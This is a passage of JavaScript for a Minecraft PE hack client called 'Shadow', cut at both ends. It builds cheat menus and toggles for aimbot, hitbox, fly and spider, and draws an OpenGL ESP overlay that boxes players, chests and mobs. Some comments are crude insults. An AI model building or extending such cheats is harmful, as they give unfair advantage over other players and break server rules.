button.setFocusableInTouchMode(false);
button.setTransformationMethod(null);
button.setSoundEffectsEnabled(true);
var buttonBg = new android.graphics.drawable.GradientDrawable();
buttonBg.setColor(btnColor);
buttonBg.setStroke(2, stroke);
buttonBg.setCornerRadius(11);
button.setBackgroundDrawable(buttonBg);
return button;
}

function dip2px(dips) {
return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

/*
Main button
func showMenuBtn()
Any clients with this has skidded from me and are dickywads!!!!!!!! ---Inferno.
*/

var isMoving1 = false;
var bx1 = 0;
var by1 = 0;
var nx1 = 0;
var ny1 = 0;
var bgravity1 = android.view.Gravity.RIGHT;

function showMenuBtn() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {
try {
var layout = new android.widget.LinearLayout(MainActivity);
layout.setOrientation(1);

var menuBtn = new styleButton();
menuBtn.setVisibility(android.view.View.VISIBLE);
if(!ghost)menuBtn.setText("Shadow");
menuBtn.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
if(isMoving1 == false){
if(ctx.getPackageName() == "net.zhuoweizhang.mcpelauncher" || ctx.getPackageName() == "net.zhuoweizhang.mcpelauncher.pro"){
if(bool != 1)mainMenu();
GUI.dismiss();
menuBtn.setVisibility(android.view.View.GONE);
/*testing();*/
Shadow.toast("Shadow users: "+dcount+"\nModules: "+modz+"\nOther: "+otherz);
}
}
}
}));
menuBtn.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(movbtn){
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
bx1 = e.getX();
by1 = e.getY();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving1 = true;
nx1 = e.getRawX();
ny1 = e.getRawY();
GUI.update(parseInt(nx1)-parseInt(bx1), parseInt(ny1)-parseInt(by1), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP || android.view.MotionEvent.ACTION_DOWN){
isMoving1 = false;
}
}
return false;
}
}));
layout.addView(menuBtn);

GUI = new android.widget.PopupWindow(layout, dip2px(65), dip2px(35));
GUI.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
GUI.showAtLocation(MainActivity.getWindow()
.getDecorView(), bgravity, bx1, by1);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}
showMenuBtn();
//skid bitch
var dragop = {
File: {
dragopDir: android.os.Environment.getExternalStorageDirectory() + "/DragOP/",
getTextFromFile: function (file) {
let readed = (new java.io.BufferedReader(new java.io.FileReader(file)));
let data = new java.lang.StringBuilder();
let string;
while((string = readed.readLine()) != null)data.append(string + "\n");
return data.toString();
},
saveTextToFile: function (file, text) { 
if(!file.exists())file.createNewFile();
let bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, text.length());
for(let i = 0; i < text.length(); i++)bytes[i] = text.charCodeAt(i);
let stream = new java.io.FileOutputStream(file);
try {
stream.write(bytes);
} finally {
stream.close();
}
}
},	

Render: {
getFloatBuffer: function (fArray) {
let bBuffer = java.nio.ByteBuffer.allocateDirect(fArray.length * 4);
bBuffer.order(java.nio.ByteOrder.nativeOrder());
let fBuffer = bBuffer.asFloatBuffer();
fBuffer.put(fArray);
fBuffer.position(0);
return fBuffer;
},
getShortBuffer: function (sArray) {
let bBuffer = java.nio.ByteBuffer.allocateDirect(sArray.length * 2);
bBuffer.order(java.nio.ByteOrder.nativeOrder());
let sBuffer = bBuffer.asShortBuffer();
sBuffer.put(sArray);
sBuffer.position(0);
return sBuffer;
},
renderer: null,
glSurface: null,
fov: 90,
color: tcolor,
initted: false,
init: function () {
if(dragop.Render.initted)return;
let options = dragop.File.getTextFromFile(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/games/com.mojang/minecraftpe/", "options.txt"));
options = options.split("\n");
options.forEach(function (entry) {
let suboption = entry.split(":");
if(suboption[0] == "gfx_field_of_view") {
dragop.Render.fov = suboption[1];
}
});
this.renderer = new android.opengl.GLSurfaceView.Renderer({
onSurfaceCreated: function (gl, config) {
let GL10 = javax.microedition.khronos.opengles.GL10;
gl.glClearColor(0, 0, 0, 0);
gl.glShadeModel(GL10.GL_SMOOTH);
gl.glClearDepthf(1.0);
gl.glDisable(GL10.GL_DITHER);
gl.glEnable(GL10.GL_DEPTH_TEST);
gl.glDepthFunc(GL10.GL_LEQUAL);
gl.glHint(GL10.GL_PERSPECTIVE_CORRECTION_HINT, GL10.GL_NICEST);
},
onSurfaceChanged: function (gl, width, height) {
let GL10 = javax.microedition.khronos.opengles.GL10;
gl.glMatrixMode(GL10.GL_PROJECTION);
gl.glLoadIdentity();
android.opengl.GLU.gluPerspective(gl, dragop.Render.fov, width / height, 0.1, 100);
gl.glMatrixMode(GL10.GL_MODELVIEW);
gl.glLoadIdentity();
},
onDrawFrame: function (gl) {
let GL10 = javax.microedition.khronos.opengles.GL10;
gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
gl.glLoadIdentity();
gl.glDisable(GL10.GL_LIGHTING);
let yaw = getYaw() % 360;
let pitch = getPitch() % 360;
let eyeX = getPlayerX();
let eyeY = getPlayerY() + 1;
let eyeZ = getPlayerZ();
let dCenterX = Math.sin(yaw / 180 * Math.PI);
let dCenterZ = Math.cos(yaw / 180 * Math.PI);
let dCenterY = Math.sqrt(dCenterX * dCenterX + dCenterZ * dCenterZ) * Math.tan((pitch - 180) / 180 * Math.PI);
let centerX = eyeX - dCenterX;
let centerZ = eyeZ + dCenterZ;
let centerY = eyeY - dCenterY;
android.opengl.GLU.gluLookAt(gl, eyeX, eyeY, eyeZ, centerX, centerY, centerZ, 0, 1.0, 0);

if(esp1) {
/* DRAW ONLY */
players.forEach(function (entry) {
if(Entity.getEntityTypeId(entry) == 63) {
if(entry != getPlayerEnt())dragop.Render.drawBox(gl, Entity.getX(entry) - 0.5, Entity.getY(entry) - 0.5, Entity.getZ(entry) - 0.5, 1, 2, 1);
}
});
}
if(esp2){
/* DRAW ONLY */
chests.forEach(function (entry2) {
dragop.Render.drawBox(gl, entry2[0] + 1 / 16, entry2[1]+1, entry2[2] + 1 / 16, 1 / 16 * 15, 0.875, 1 / 16 * 15);
});
}
if(esp3){
/* DRAW ONLY */
mobs.forEach(function (entry3) {
if(Entity.getEntityTypeId(entry3) != 63) {
if(entry3 != getPlayerEnt())dragop.Render.drawBox(gl, entry3[0] + 1 / 16, entry3[1]+1, entry3[2] + 1 / 16, 1 / 16 * 15, 0.875, 1 / 16 * 15);
}
});
}
if(esp4){
/* DRAW ONLY */
items.forEach(function (entry4) {
if(Entity.getEntityTypeId(entry4) == 64 && Entity.getEntityTypeId(entry4) != 63) {
if(entry4 != getPlayerEnt())dragop.Render.drawBox(gl, entry4[0] + 1 / 16, entry4[1]+1, entry4[2] + 1 / 16, 1 / 16 * 15, 0.875, 1 / 16 * 15);
}
});
}

}
});
ctx.runOnUiThread(new java.lang.Runnable({
run: function () {
dragop.Render.glSurface = new android.opengl.GLSurfaceView(ctx);
dragop.Render.glSurface.setZOrderOnTop(true);
dragop.Render.glSurface.setEGLConfigChooser(8, 8, 8, 8, 16, 0);
dragop.Render.glSurface.getHolder().setFormat(android.graphics.PixelFormat.TRANSLUCENT);
dragop.Render.glSurface.setRenderer(dragop.Render.renderer);
ctx.getWindow().getDecorView().addView(dragop.Render.glSurface);
dragop.Render.initted = true;
}
}));
},
drawBox: function (gl, x, y, z, xsize, ysize, zsize) {
let GL10 = javax.microedition.khronos.opengles.GL10;
let size = new Array(xsize, ysize, zsize);
let vertices = [
0, 0, 0,
size[0], 0, 0,
0, 0, size[2],
size[0], 0, size[2],

0, size[1], 0,
size[0], size[1], 0,
0, size[1], size[2],
size[0], size[1], size[2]
];
let vertexBuffer = dragop.Render.getFloatBuffer(vertices);
let lineIndices = [
0, 1,
0, 2,
0, 4,

3, 1,
3, 2,
3, 7,

5, 4,
5, 7,
5, 1,

6, 4,
6, 7,
6, 2
];
let polyIndices = [
0, 1, 4,
1, 4, 5,

2, 3, 6,
7, 6, 3,

1, 3, 7,
7, 1, 5,

0, 2, 6,
6, 0, 4,

0, 1, 2,
3, 1, 2,

4, 5, 6,
7, 5, 6
];
let lineBuffer = dragop.Render.getShortBuffer(lineIndices);
let polyBuffer = dragop.Render.getShortBuffer(polyIndices);
gl.glTranslatef(x, y, z);
gl.glFrontFace(GL10.GL_CCW);
gl.glEnable(GL10.GL_BLEND);
//gl.glEnable(GL10.GL_LINE_SMOOTH);
gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);
gl.glLineWidth(4);
gl.glColor4f(android.graphics.Color.red(dragop.Render.color) / 255,android.graphics.Color.green(dragop.Render.color) / 255, android.graphics.Color.blue(dragop.Render.color) / 255, 0.7);
gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
gl.glVertexPointer(3, GL10.GL_FLOAT, 0, vertexBuffer);
gl.glDrawElements(GL10.GL_LINES, lineIndices.length, GL10.GL_UNSIGNED_SHORT, lineBuffer);
gl.glColor4f(android.graphics.Color.red(dragop.Render.color) / 255, android.graphics.Color.green(dragop.Render.color) / 255, android.graphics.Color.blue(dragop.Render.color) / 255, 0.2);
gl.glDrawElements(GL10.GL_TRIANGLES, polyIndices.length, GL10.GL_UNSIGNED_SHORT, polyBuffer);
gl.glDisable(GL10.GL_LINE_SMOOTH);
gl.glTranslatef(-x, -y, -z);
},
drawLine: function (gl, x, y, z, x2, y2, z2) {
let GL10 = javax.microedition.khronos.opengles.GL10;
let size = new Array(x2, y2, z2);
let vertices = [
0, 0, 0,
x2 - x, y2 - y, z2 - z
];
let vertexBuffer = dragop.Render.getFloatBuffer(vertices);
let indices = [
0, 1
];
let indexBuffer = dragop.Render.getShortBuffer(indices);
gl.glTranslatef(x, y, z);
gl.glEnable(GL10.GL_BLEND);
gl.glDepthMask(false);
//gl.glEnable(GL10.GL_LINE_SMOOTH);
gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);
gl.glLineWidth(4);
gl.glColor4f(android.graphics.Color.red(dragop.Render.color) / 255,android.graphics.Color.green(dragop.Render.color) / 255, android.graphics.Color.blue(dragop.Render.color) /255, 0.7);
gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
gl.glVertexPointer(3, GL10.GL_FLOAT, 0, vertexBuffer);
gl.glDrawElements(GL10.GL_LINES, indices.length, GL10.GL_UNSIGNED_SHORT, indexBuffer);
gl.glTranslatef(-x, -y, -z);
gl.glDepthMask(true);
gl.glDisable(GL10.GL_LINE_SMOOTH);
}
}
};

/*
jump button
*/

var isMoving2 = false;
var bx2 = 0;
var by2 = 0;
var nx2 = 0;
var ny2 = 0;

function showJumpButton() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var jumpLayout = new android.widget.LinearLayout(MainActivity);
jumpLayout.setOrientation(1);

var jumpBtn = new styleButton();
jumpBtn.setText("Jump");
jumpBtn.setTextSize(7);
jumpBtn.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
if(isMoving2 == false){
Entity.setVelY(Player.getEntity(), 0.4);
}
}
}));
jumpBtn.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(movbtn){
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
bx2 = e.getX();
by2 = e.getY();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
nx2 = e.getRawX();
ny2 = e.getRawY();
jumpGui.update(parseInt(nx2)-parseInt(bx2), parseInt(ny2)-parseInt(by2), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP || android.view.MotionEvent.ACTION_DOWN){
isMoving2 = false;
}
}
return false;
}
}));
jumpLayout.addView(jumpBtn);

jumpGui = new android.widget.PopupWindow(jumpLayout, dip2px(45), dip2px(45));

jumpGui.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

jumpGui.showAtLocation(MainActivity.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

/*
keybinds
*/
function showKeys() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var keyLayout = new android.widget.LinearLayout(MainActivity);
var keyScroll = new android.widget.ScrollView(MainActivity);
var keyLayout1 = new android.widget.LinearLayout(MainActivity);
keyLayout.setOrientation(1);
keyLayout1.setOrientation(1);
keyScroll.addView(keyLayout);
keyLayout1.addView(keyScroll);

var k1 = new keyButton();
var k2 = new keyButton();
var k3 = new keyButton();
var k4 = new keyButton();
var k5 = new keyButton();
var k6 = new keyButton();
var k7 = new keyButton();
var k8 = new keyButton();
var k9 = new keyButton();
var k10 = new keyButton();

k1.setText("Aimbot");
if(aimbot == true)k1.setTextColor(android.graphics.Color.GREEN);
k1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
aimbot ? aimbot = false : aimbot = true;
refreshToggle();
if(aimbot == true)k1.setTextColor(android.graphics.Color.GREEN);
if(aimbot == false)k1.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k1);

k2.setText("Autosword");
if(autosword == true)k2.setTextColor(android.graphics.Color.GREEN);
k2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autosword ? autosword = false : autosword = true;
if(autosword == true)k2.setTextColor(android.graphics.Color.GREEN);
if(autosword == false)k2.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k2);

k3.setText("Hit-Behind");
if(behind == true)k3.setTextColor(android.graphics.Color.GREEN);
k3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
behind ? behind = false : behind = true;
if(behind == true)k3.setTextColor(android.graphics.Color.GREEN);
if(behind == false)k3.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k3);

k4.setText("Hitbox");
if(hitbox == true)k4.setTextColor(android.graphics.Color.GREEN);
k4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
hitbox ? hitbox = false : hitbox = true;
refreshToggle();
if(hitbox == true)k4.setTextColor(android.graphics.Color.GREEN);
if(hitbox == false)k4.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k4);

k5.setText("FastEat");
if(fasteat == true)k5.setTextColor(android.graphics.Color.GREEN);
k5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fasteat ? fasteat = false : fasteat = true;
if(fasteat == true){k5.setTextColor(android.graphics.Color.GREEN);
fastEat(true);}
if(fasteat == false){k5.setTextColor(android.graphics.Color.RED);
fastEat(false);}
}
}));
keyLayout.addView(k5);

k6.setText("Spider");
if(spider == true)k6.setTextColor(android.graphics.Color.GREEN);
k6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
spider ? spider = false : spider = true;
if(spider == true)k6.setTextColor(android.graphics.Color.GREEN);
if(spider == false)k6.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k6);

k7.setText("Glide");
if(glide == true)k7.setTextColor(android.graphics.Color.GREEN);
k7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
glide ? glide = false : glide = true;
if(glide == true)k7.setTextColor(android.graphics.Color.GREEN);
if(glide == false)k7.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k7);

k8.setText("ArmorESP");
if(armoresp == true)k8.setTextColor(android.graphics.Color.GREEN);
k8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
armoresp ? armoresp = false : armoresp = true;
if(armoresp == true)k8.setTextColor(android.graphics.Color.GREEN);
if(armoresp == false)k8.setTextColor(android.graphics.Color.RED);
}
}));
keyLayout.addView(k8);

k9.setText("sFly");
if(fly1 == true)k9.setTextColor(android.graphics.Color.GREEN);
k9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fly1 ? fly1 = false : fly1 = true;
if(fly1 == true){
k9.setTextColor(android.graphics.Color.GREEN);
Player.setCanFly(true);
}
if(fly1 == false){
k9.setTextColor(android.graphics.Color.RED);
Player.setCanFly(false);
}
}
}));
keyLayout.addView(k9);

k10.setText("Totem");
k10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
Entity.setOffhandSlot(getPlayerEnt(), 450, 1, 0);
}
}));
keyLayout.addView(k10);

keyGui = new android.widget.PopupWindow(keyLayout1, dip2px(45), MainActivity.getWindowManager().getDefaultDisplay().getHeight() / 3);

keyGui.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

keyGui.showAtLocation(MainActivity.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, 0, 130);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

var toggled;
function refreshToggle(){
if(typeof(toggled) != "undefined")toggled.dismiss();
for(var i = 0; i < 2; i++){
if(i == 1)showToggled();
}
}

function showToggled() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {
try {
var layout = new android.widget.LinearLayout(MainActivity);
layout.setOrientation(1);

var test1 = new android.widget.TextView(MainActivity);
var test2 = new android.widget.TextView(MainActivity);
var test3 = new android.widget.TextView(MainActivity);

test1.setText("Aimbot");
if(aimbot)test1.setTextColor(android.graphics.Color.GREEN);
if(!aimbot)test1.setTextColor(android.graphics.Color.TRANSPARENT);
test2.setText("Hitbox");
if(hitbox)test2.setTextColor(android.graphics.Color.GREEN);
if(!hitbox)test2.setTextColor(android.graphics.Color.TRANSPARENT);
test3.setText("PlayerESP");
if(esp1)test3.setTextColor(android.graphics.Color.GREEN);
if(!esp1)test3.setTextColor(android.graphics.Color.TRANSPARENT);

layout.addView(test1);
layout.addView(test2);
layout.addView(test3);

toggled = new android.widget.PopupWindow(layout, dip2px(100), dip2px(150));
toggled.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
toggled.setTouchable(false);
toggled.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 1000, 0);
} catch (error) {
print(error);
}

}
}));
}
showToggled();

/*
The interface
func mainMenu()
*/
function mainMenu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var menuLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var menuScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var menuScroll = new android.widget.ScrollView(MainActivity);
var menuLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
menuLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
menuLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
menuLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
menuLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
menuScroll.addView(menuLayout);
menuLayout1.addView(menuScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

menuScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)menu.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Shadow "+version);
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
showMenuBtn();
}
}));
menuLayout.addView(exit);

var settings = new styleButton();
var combat = new styleButton();
var move = new styleButton();
var player = new styleButton();
var render = new styleButton();
var world = new styleButton();
var other = new styleButton();
var credits = new styleButton();

/*italian*/
if(getLang == "it_IT")settings.setText("Impostazione");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")settings.setText("Ajustes");
/*korean*/
if(getLang == "ko_KR")settings.setText("설정");
/*german*/
if(getLang == "de_DE")settings.setText("Einstellungen");
/*japanese*/
if(getLang == "ja_JP")settings.setText("オプション");
/*dutch*/
if(getLang == "nl_NL")settings.setText("Instellingen");
/*chinese*/
if(getLang == "zh_CN")settings.setText("设置");
/*russian*/
if(getLang == "ru_RU")settings.setText("конфигурация");
/*greek*/
if(getLang == "el_GR")settings.setText("Ρυθμίσεις");
/*czech*/
if(getLang == "cs_CZ")settings.setText("Nastavení");

/*italian*/
if(getLang == "it_IT")combat.setText("Combattimento");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")combat.setText("Combate");
/*korean*/
if(getLang == "ko_KR")combat.setText("전투");
/*german*/
if(getLang == "de_DE")combat.setText("Combat");
/*japanese*/
if(getLang == "ja_JP")combat.setText("戦闘");
/*dutch*/
if(getLang == "nl_NL")combat.setText("Gevecht");
/*chinese*/
//if(getLang == "zh_CN")combat.setText("");
/*russian*/
if(getLang == "ru_RU")combat.setText("бой");
/*greek*/
if(getLang == "el_GR")combat.setText("Combat");
/*czech*/
if(getLang == "cs_CZ")combat.setText("Útok");

/*italian*/
if(getLang == "it_IT")move.setText("Movimento");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")move.setText("Movimiento");
/*korean*/
if(getLang == "ko_KR")move.setText("움직임");
/*german*/
if(getLang == "de_DE")move.setText("Movement");
/*japanese*/
if(getLang == "ja_JP")move.setText("移動");
/*dutch*/
if(getLang == "nl_NL")move.setText("Beweging");
/*chinese*/
//if(getLang == "zh_CN")move.setText("");
/*russian*/
if(getLang == "ru_RU")move.setText("движение");
/*greek*/
if(getLang == "el_GR")move.setText("Κίνηση");
/*czech*/
if(getLang == "cs_CZ")move.setText("Pohyb");

/*italian*/
if(getLang == "it_IT")player.setText("Giocatore");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")player.setText("Jugador");
/*korean*/
if(getLang == "ko_KR")player.setText("플레이어");
/*german*/
if(getLang == "de_DE")player.setText("Spieler");
/*japanese*/
if(getLang == "ja_JP")player.setText("プレーヤー");
/*dutch*/
if(getLang == "nl_NL")player.setText("Speler");
/*chinese*/
//if(getLang == "zh_CN")player.setText("");
/*russian*/
if(getLang == "ru_RU")player.setText("игрок");
/*greek*/
if(getLang == "el_GR")player.setText("Παίκτης");
/*czech*/
if(getLang == "cs_CZ")player.setText("Hráč");

/*italian*/
if(getLang == "it_IT")render.setText("Render");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")render.setText("Render");
/*korean*/
if(getLang == "ko_KR")render.setText("Render");
/*german*/
if(getLang == "de_DE")render.setText("Render");
/*japanese*/
if(getLang == "ja_JP")render.setText("Render");
/*dutch*/
if(getLang == "nl_NL")render.setText("Render");
/*chinese*/
//if(getLang == "zh_CN")render.setText("");
/*russian*/
if(getLang == "ru_RU")render.setText("Render");
/*greek*/
if(getLang == "el_GR")render.setText("Render");
/*czech*/
if(getLang == "cs_CZ")render.setText("Render");

/*italian*/
if(getLang == "it_IT")world.setText("Mondo");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")world.setText("Mundo");
/*korean*/
if(getLang == "ko_KR")world.setText("세계");
/*german*/
if(getLang == "de_DE")world.setText("Welt");
/*japanese*/
if(getLang == "ja_JP")world.setText("世界");
/*dutch*/
if(getLang == "nl_NL")world.setText("Wereld");
/*chinese*/
//if(getLang == "zh_CN")world.setText("");
/*russian*/
if(getLang == "ru_RU")world.setText("мира");
/*greek*/
if(getLang == "el_GR")world.setText("Κόσμος");
/*czech*/
if(getLang == "cs_CZ")world.setText("Svět");

/*italian*/
if(getLang == "it_IT")other.setText("Altro");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")other.setText("Otro");
/*korean*/
if(getLang == "ko_KR")other.setText("기타");
/*german*/
if(getLang == "de_DE")other.setText("Verschiedenes");
/*japanese*/
if(getLang == "ja_JP")other.setText("その他");
/*dutch*/
if(getLang == "nl_NL")other.setText("Anders");
/*chinese*/
//if(getLang == "zh_CN")other.setText("");
/*russian*/
if(getLang == "ru_RU")other.setText("Другие");
/*greek*/
if(getLang == "el_GR")other.setText("Υπόλοιπα");
/*czech*/
if(getLang == "cs_CZ")other.setText("Jiný");

/*italian*/
if(getLang == "it_IT")credits.setText("Crediti");
/*spanish*/
if(getLang == "es_MX" || getLang == "es_ES")credits.setText("Creditos");
/*korean*/
if(getLang == "ko_KR")credits.setText("크레딧");
/*german*/
if(getLang == "de_DE")credits.setText("Credits");
/*japanese*/
if(getLang == "ja_JP")credits.setText("クレジット");
/*dutch*/
if(getLang == "nl_NL")credits.setText("Credits");
/*chinese*/
//if(getLang == "zh_CN")credits.setText("");
/*russian*/
if(getLang == "ru_RU")credits.setText("зачет");
/*greek*/
if(getLang == "el_GR")credits.setText("Δημιουργός");
/*czech*/
if(getLang == "cs_CZ")credits.setText("Kredity");

settings.setText("Settings");
settings.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
settings_menu();
}
}));
menuLayout.addView(settings);

combat.setText("Combat");
combat.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
combat_menu();
}
}));
menuLayout.addView(combat);

move.setText("Movement");
move.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
movement_menu();
}
}));
menuLayout.addView(move);

player.setText("Player");
player.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
player_menu();
}
}));
menuLayout.addView(player);

render.setText("Render");
render.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
render_menu();
}
}));
menuLayout.addView(render);

world.setText("World");
world.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
world_menu();
}
}));
menuLayout.addView(world);

other.setText("Other");
other.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
other_menu();
}
}));
menuLayout.addView(other);

credits.setText("Credits");
credits.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
menu.dismiss();
credit();
}
}));
menuLayout.addView(credits);

if(mnuOri == 0)menu = new android.widget.PopupWindow(menuLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)menu = new android.widget.PopupWindow(menuLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
menuLayout1.setBackgroundDrawable(bg);
menuLayout1.setPadding(20, 0, 20, 0);

menu.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function settings_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var settingLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var settingScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var settingScroll = new android.widget.ScrollView(MainActivity);
var settingLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
settingLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
settingLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
settingLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
settingLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
settingScroll.addView(settingLayout);
settingLayout1.addView(settingScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

settingScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)settings.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
mainMenu();
}
}));
settingLayout.addView(exit);

var sm0 = new styleButton("Movable buttons", "Allows you to move jump & Shadow button.");
if(movbtn)sm0.setTextColor(android.graphics.Color.GREEN);
if(!movbtn)sm0.setTextColor(btnText);
sm0.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
movbtn ? movbtn = false : movbtn = true;
if(movbtn) {
sm0.setTextColor(android.graphics.Color.GREEN);
Shadow.save();
movbtn = true;
} else {
sm0.setTextColor(android.graphics.Color.RED);
Shadow.save();
movbtn = false;
}
}
}));
settingLayout.addView(sm0);

var s9 = new styleButton("Keybinds", "Enable shortcuts.");
if(keybind)s9.setTextColor(android.graphics.Color.GREEN);
if(!keybind)s9.setTextColor(btnText);
s9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
keybind ? keybind = false : keybind = true;
if(keybind) {
s9.setTextColor(android.graphics.Color.GREEN);
showKeys();
keybind = true;
} else {
s9.setTextColor(android.graphics.Color.RED);
keyGui.dismiss();
keybind = false;
}
}
}));
settingLayout.addView(s9);

var s1 = new styleButton("Check slapper", "Don't lock onto slappers/NPCs.");
if(checkslapper)s1.setTextColor(android.graphics.Color.GREEN);
if(!checkslapper)s1.setTextColor(btnText);
